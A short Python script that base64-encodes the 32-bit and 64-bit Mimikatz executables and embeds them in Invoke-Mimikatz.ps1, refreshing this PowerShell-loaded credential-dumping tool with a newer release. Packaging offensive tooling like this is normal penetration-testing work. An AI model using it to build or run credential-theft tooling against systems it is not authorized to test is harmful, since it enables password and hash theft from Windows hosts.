#!/usr/bin/python3
# Add the newest version of Mimikatz to Invoke-Mimikatz, a powershell version of mimikatz
# Get the newest version von Benjamin Delphis Github first and extract it to this directory

# wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200308/mimikatz_trunk.7z
# Got to be replaced with the most recent version, this one here is from March 2020


import fileinput
import base64



with open("./mimikatz_trunk/Win32/mimikatz.exe", "rb") as f:
    win32 = base64.b64encode(f.read()).decode()

with open("./mimikatz_trunk/x64/mimikatz.exe", "rb") as f:
    x64 = base64.b64encode(f.read()).decode()


for line in fileinput.FileInput("./Invoke-Mimikatz.ps1", inplace=1):

	line = line.rstrip('\r\n')
	if "$PEBytes64 = " in line:
		print("$PEBytes64 = '" + x64 + "'")
	elif "$PEBytes32 = " in line:
		print("$PEBytes32 = '" + win32 + "'")
	else:
		print(line)
